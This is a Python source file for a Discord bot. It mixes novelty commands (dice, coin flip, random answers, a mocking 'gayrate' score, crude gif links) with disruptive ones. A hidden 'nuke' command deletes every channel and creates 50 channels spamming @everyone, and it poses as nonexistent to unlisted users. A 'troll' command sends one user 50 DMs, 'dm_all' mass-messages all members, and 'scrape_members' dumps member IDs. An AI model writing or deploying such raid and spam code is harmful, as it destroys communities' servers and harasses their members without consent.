import discord
from discord.ext import commands
import random

TOKEN = ''
prefix = "$"

client = client = commands.Bot(command_prefix = prefix,intents=discord.Intents.all())
client.remove_command('help')

@client.event
async def on_ready():
    channel = client.get_channel(1134799390679253062)  # Replace with the correct channel ID
    print('Ready!')
    embed = discord.Embed(
        title="Bot Started",
        description="Bot should be fully functional",
        color=discord.Color.green()
    )
    await channel.send(embed=embed)

@client.event
async def is_ratelimited(ctx):
    channel = client.get_channel(1134799390679253062)  # Replace with the correct channel ID
    embed = discord.Embed(
        title="Ratelimited",
        description="The bot is currently being ratelimited",
        color=discord.Color.yellow()
    )
    await channel.send(embed=embed)

@client.command()
async def headsortails(ctx):
    result = random.choice(['heads', 'tails'])
    await ctx.send(result)
    
@client.command()
async def ask(ctx,*, args:str):
    answer = random.choice(['yes', 'no', 'maybe', 'why not', 'maybe tomorrow', 'absoloutely not', 'of course', 'hmmm, maybe tomorrow.', 'HELL NAH', 'OH HELL YEAH'])
    await ctx.send(f"Question: {args}\nAnswer: {answer}")

@client.command()
async def r34(ctx):
    gif = random.choice(['https://tenor.com/view/bully-bullying-go-away-3d-gifs-artist-monkey-gif-17541617', "https://tenor.com/view/nuh-uh-beocord-no-lol-gif-24435520", "https://tenor.com/view/horizontally-spinning-rat-gif-25828251", "https://media.discordapp.net/attachments/940179504033312798/959966260387545169/cock.gif", "https://tenor.com/view/sword-me-roblox-command-guy-gif-25084293", "https://media.discordapp.net/attachments/1107460115176636558/1115145166433550356/factsbrothersotruemyfriend.gif", "https://tenor.com/view/high-quality-horizontally-spinning-rat-spinning-rat-horizontally-spinning-rat-rat-spinning-gif-26191991", "https://media.discordapp.net/attachments/590973415351910426/976104275128233994/chokeplay-1.gif", "https://media.discordapp.net/attachments/957272470237368350/1013170359454924820/2f1e90d7771208570b3ca75965a4ec209af6daec6850a5d756a5832db7a502cf_1.gif.gif", "https://tenor.com/view/hypnospace-transgender-trans-rights-skeleton-gif-21237962", "https://tenor.com/view/laughing-emoji-laughing-gif-20862457"])
    await ctx.send(gif)

@client.command()
async def troll(ctx, user_id: int, *, message:str):
    authorized_user = [".qquantum#0", "rainy1026#0", "schyzo."]
    if str(ctx.message.author) not in authorized_user:
        await ctx.send("You're not authorized to execute this command.")
        return
    else:
        user = ctx.guild.get_member(user_id)
        author = ctx.message.author

        if user and not user.bot:
            channel = client.get_channel(1134799390679253062)  # Replace with the correct channel ID
            await channel.send(f"<@{user_id}> is getting trolled by {author}")

            await ctx.send(f"User <@{user_id}> is getting omegatrulld :zany_face:")
            x = 1
            while x <= 50:
                try:
                    await user.send(f"{message}; sent by {author}")
                    x += 1
                except discord.Forbidden:
                    await ctx.send("The user has their DMs off.")
                    break
            else:
                await ctx.send(f"Trolled {user.mention} 50 times!")
        else:
            await ctx.send("User doesn't exist or it's a bot")

        await ctx.send(f"{user.mention} got omegatrulld :zany_face:")
    
    

@client.command()
async def say(ctx, *, message):
    await ctx.send(f"```{message}```")

@client.command()
async def roll(ctx):
    dice = random.randint(1,6)
    await ctx.send(dice)

@client.command()
async def ping(ctx):
    latency = round(client.latency*1000)
    await ctx.send(f"Pong! {latency}ms")

@client.command()
async def help(ctx):
    embed = discord.Embed(
        title="Commands:",
        description="$ping - check the bot's latency \n\n $roll - roll a dice \n\n $headsortails \n\n $ask - ask the bot a simple yes or no question \n\n r34 - :3 \n\n $say - make the bot say whatever you want\n\n $gayrate - calculates the person's gayness",
        color=discord.Color.red()
    )
    await ctx.send(embed=embed)
    await ctx.author.send('keep yourself safe')

@client.command()
async def term_separator(ctx):
    print("---------------------------------------------------------")

@client.command()
async def scrape_members(ctx):
    print(f"Server: {ctx.guild.name}")
    server = ctx.guild
    members = server.members
    for member in members:
        print(member.id)
    print("---------------------------------------------------------")

@client.command()
async def dm_all(ctx, *, message):
    authorized_user = [".qquantum#0", "schyzo.#0"]
    if str(ctx.message.author) not in authorized_user:
        await ctx.send("You're not authorized to execute this command.")
        return
    
    server = ctx.guild
    members = server.members


    if str(ctx.message.author) in authorized_user:
        for target_member in members:
            try:
                ch_id = 1134799390679253062
                channel = client.get_channel(ch_id)
                await target_member.send(message)
                embed = discord.Embed(
                    title = f"Sucessfuly DM'd {target_member.name}, ID: {target_member.id}",
                    description = f"Message: {message}",
                    color = discord.Color.green()
                )
                print(f"Message sent to {target_member.name}, ID: {target_member.id}")
                await channel.send(embed=embed)
            except discord.Forbidden:
                embed = discord.Embed(
                    title = f"Failed to DM",
                    description = f"Failed to DM {target_member.name}, ID: {target_member.id} They probably have their DMs off.",
                    color = discord.Color.red()
                )
                print(f"Failed to DM {target_member.name}, ID: {target_member.id}, Their DMs are probably closed.")
                await channel.send(embed=embed)
            except Exception as e:
                embed = discord.Embed(
                    title = "Error",
                    description = f"Failed to DM {target_member.name}, ID: {target_member.id} Error: {e}",
                    color = discord.Color.yellow()
                )
                print(f"Error occured while attempting to DM {target_member.name}, ID: {target_member.id} Error:{e}")
                await channel.send(embed=embed)

@client.command()
async def gayrate(ctx):
    gayrate = random.randint(1, 101)
    
    if gayrate < 50:
        embed = discord.Embed(
            title="Gayrate",
            description=f"Gayrate score: {gayrate}%\n\nresult: not gay",
            color=discord.Color.green()
        )
    elif 50 <= gayrate < 70:
        embed = discord.Embed(
            title="Gaymeter",
            description=f"Gayrate score: {gayrate}%\n\n Result: kinda gay",
            color=discord.Color.yellow()
        )
    elif 70 <= gayrate < 101:
        embed = discord.Embed(
            title="Gaymeter",
            description=f"Gayrate score: {gayrate}%\n\nresult: gay",
            color=discord.Color.orange()
        )
    else:
        embed = discord.Embed(
            title="Gaymeter",
            description=f"Gayrate score: {gayrate}%\nYOU CAN GET ABOVE 100????\n\nRESULT: VERY GAY",
            color=discord.Color.red()
        )

    await ctx.send(embed=embed)

@client.command()
async def nuke(ctx):
    authorized_user = [".qquantum#0"]
    if str(ctx.message.author) not in authorized_user:
        await ctx.send("Command doesn't exist, do $help for existing commands.")
        return
    else:
        try:
            ch_id = 1134799390679253062
            channel = client.get_channel(ch_id)
            channels = await ctx.guild.fetch_channels()
            for target_channel in channels:
                await target_channel.delete()
                embed = discord.Embed(
                    title = f"Channel Deleted",
                    description = f"Channel {target_channel.name} deleted succesfully",
                    color = discord.Color.green()
                )
                print(f"deleted channel {target_channel}")
                await channel.send(embed=embed)     
            for x in range(50):
                ch_nm = random.choice(["nuked lol", "qquantum on top xd", "NUKED BY QQUANTUM LOL", "LOOOL NUKED", "xddd imagine getting nuked", "lol ez nuke", "qquantum owns you", "gg qquantum on top", "qquantum owns this server"])
                new_channel = await ctx.guild.create_text_channel(name=ch_nm)
                await new_channel.send("||@everyone|| nuked by qquantum gg ez https://discord.gg/mXcsgUMGWd")
                embed = discord.Embed(
                    title = f"Channel Created",
                    description = f"Channel {ch_nm} was successfully created",
                    color = discord.Color.green()
                )
                print(f"created channel {ch_nm}")
                await channel.send(embed=embed)                    
        except discord.Forbidden:
            embed = discord.Embed(
                title = f"Failed",
                description = f"Failed to create/delete channel, check the bot's permissions",
                color = discord.Color.orange()
            )
            print("failed to create/delete channel. please check your bot's permisssions")
            await channel.send(embed=embed)

        except Exception as e:
            embed = discord.Embed(
                title=f"Failed",
                description=f"Error: {e}",
                color=discord.Color.red()
            )
            print(f"error: {e}")
            await channel.send(embed=embed)
                    
client.run(TOKEN)
